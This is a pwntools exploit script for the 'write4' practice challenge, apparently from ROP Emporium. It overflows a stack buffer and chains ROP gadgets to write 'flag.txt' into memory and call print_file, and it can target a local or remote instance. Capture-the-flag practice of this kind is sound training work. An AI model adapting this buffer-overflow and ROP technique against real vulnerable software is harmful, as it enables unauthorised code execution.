#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('write4')

filterwarnings("ignore")
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def write():
    offset = 40
    pop_rdi = 0x0000000000400693 # pop rdi; ret;
    file_addr = exe.sym['__bss_start']
    write_what_where = 0x0000000000400628 # mov qword ptr [r14], r15; ret; 
    pop_r14_pop_r15 = 0x0000000000400690 # pop r14; pop r15; ret; 


    payload = flat({
        offset: [
            pop_r14_pop_r15,
            file_addr,
            b'flag.txt',
            write_what_where,
            pop_rdi,
            file_addr,
            exe.plt['print_file']
        ]
    })

    io.sendline(payload)
    io.recvuntil('you!')
    io.recvline()
    flag = io.recv(1024).decode()
    info(f"Flag: {flag}")

    io.close()

def main():
    
    init()
    write()

if __name__ == '__main__':
    main()

